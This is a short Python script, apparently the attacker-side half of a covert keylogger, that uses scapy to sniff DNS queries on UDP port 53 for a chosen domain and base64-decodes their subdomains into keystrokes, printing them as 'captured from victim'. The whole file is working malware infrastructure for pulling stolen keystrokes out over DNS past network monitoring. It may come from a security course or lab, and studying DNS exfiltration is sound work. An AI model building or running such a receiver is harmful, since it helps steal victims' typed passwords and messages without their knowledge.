# attacker_receiver.py
from scapy.all import sniff, DNS, DNSQR
import base64

# Configuration
TARGET_DOMAIN = "test.google.com"  # Must match the Victim's domain

def decode_covert_traffic(packet):
    # 1. Check if packet has DNS layer and is a QUERY (qr=0)
    if packet.haslayer(DNS) and packet[DNS].qr == 0:
        if packet.haslayer(DNSQR):
            query = packet[DNSQR].qname.decode('utf-8')

            # 2. Filter for our target domain
            if TARGET_DOMAIN in query:
                try:
                    # Extract the subdomain (the encoded data)
                    # Query looks like: <BASE64>.test.google.com.
                    encoded_data = query.split(f".{TARGET_DOMAIN}")[0]

                    # Fix Base64 padding if needed
                    missing_padding = len(encoded_data) % 4
                    if missing_padding:
                        encoded_data += '=' * (4 - missing_padding)

                    # Decode
                    decoded_keystrokes = base64.urlsafe_b64decode(encoded_data).decode('utf-8')
                    print(f"[+] CAPTURED FROM VICTIM: {decoded_keystrokes}")
                    print(f"    (Raw Query: {query})")

                except Exception as e:
                    print(f"[-] Detected traffic but failed to decode: {query} | Error: {e}")

# Start Sniffing
print(f"[*] Attacker Listening for Covert DNS queries to *.{TARGET_DOMAIN}...")
# We filter for UDP port 53 to capture incoming DNS requests
sniff(filter="udp port 53", prn=decode_covert_traffic, store=0)
